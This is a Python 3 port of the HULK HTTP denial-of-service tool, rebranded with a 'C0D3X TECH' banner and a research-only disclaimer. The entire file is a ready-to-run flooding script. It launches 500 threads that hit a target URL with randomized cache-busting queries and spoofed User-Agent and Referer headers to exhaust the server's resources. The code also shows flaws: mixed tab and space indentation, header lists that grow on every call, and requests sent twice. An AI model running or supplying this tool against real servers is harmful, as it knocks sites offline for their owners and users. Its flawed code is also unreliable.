# ----------------------------------------------------------------------------------------------
# HULK - HTTP Unbearable Load King (Python 3 version)
#
# This tool is a DoS tool that is meant to put heavy load on HTTP servers in order to exhaust
# the resource pool. It is meant for research and stress-testing purposes only.
# Any malicious usage of this tool is prohibited.
#
# Original author: Barry Shteiman , version 1.0
# Python3 update: adapted from legacy code
# ----------------------------------------------------------------------------------------------

import sys
import threading
import random
import re
import urllib.request
import urllib.error

# global params
url = ''
host = ''
headers_useragents = []
headers_referers = []
request_counter = 0
flag = 0
safe = 0

def inc_counter():
    global request_counter
    request_counter += 1

def set_flag(val):
    global flag
    flag = val

def set_safe():
    global safe
    safe = 1

# generates a user agent array
def useragent_list():
    global headers_useragents
    headers_useragents.extend([
        'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
        'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
        'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
        'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
        'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
        'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
        'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
        'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51'
    ])
    return headers_useragents

# generates a referer array
def referer_list():
    global headers_referers
    headers_referers.extend([
        'http://www.google.com/?q=',
        'http://www.usatoday.com/search/results?q=',
        'http://engadget.search.aol.com/search?q=',
        'http://' + host + '/'
    ])
    return headers_referers

# builds random ascii string
def buildblock(size):
    return ''.join(chr(random.randint(65, 90)) for _ in range(size))

def usage():
    print('---------------------------------------------------')
    print('USAGE: python3 hulk.py <url>')
    print('you can add "safe" after url, to autoshut after DoS')
    print('---------------------------------------------------')

# http request
def httpcall(url):
    useragent_list()
    referer_list()
    code = 0
    param_joiner = "&" if "?" in url else "?"
    request_url = url + param_joiner + buildblock(random.randint(3, 10)) + '=' + buildblock(random.randint(3, 10))
    req = urllib.request.Request(request_url)
    req.add_header('User-Agent', random.choice(headers_useragents))
    req.add_header('Cache-Control', 'no-cache')
    req.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
    req.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(5, 10)))
    req.add_header('Keep-Alive', str(random.randint(110, 120)))
    req.add_header('Connection', 'keep-alive')
    req.add_header('Host', host)

    try:
        urllib.request.urlopen(req)
    except urllib.error.HTTPError as e:
        set_flag(1)
        print('Response Code 500')
        code = 500
    except urllib.error.URLError as e:
        sys.exit()
    else:
        inc_counter()
        urllib.request.urlopen(req)
    return code

# http caller thread
class HTTPThread(threading.Thread):
    def run(self):
        try:
            while flag < 2:
                code = httpcall(url)
                if (code == 500) and (safe == 1):
                    set_flag(2)
        except Exception as ex:
            pass

# monitors http threads and counts requests
class MonitorThread(threading.Thread):
    def run(self):
        global request_counter
        previous = request_counter
        while flag == 0:
            if (previous + 100 < request_counter) and (previous != request_counter):
                print("%d Requests Sent" % (request_counter))
                previous = request_counter
        if flag == 2:
            print("\n-- HULK Attack Finished --")

# execute
if len(sys.argv) < 2:
    usage()
    sys.exit()
else:
    if sys.argv[1] == "help":
        usage()
        sys.exit()
    else:
		print("""
---------------------------------------------------
 C0D3X TECH - HTTP Stress Test Utility
 Based on HULK (Python3 adaptation)
 For research & resilience testing only
---------------------------------------------------
""")
        print("-- HULK Attack Started --")
        if len(sys.argv) == 3 and sys.argv[2] == "safe":
            set_safe()
        url = sys.argv[1]
        if url.count("/") == 2:
            url = url + "/"
        m = re.search(r'(https?\://)?([^/]*)/?.*', url)
        host = m.group(2)
        for i in range(500):
            t = HTTPThread()
            t.start()
        t = MonitorThread()
        t.start()
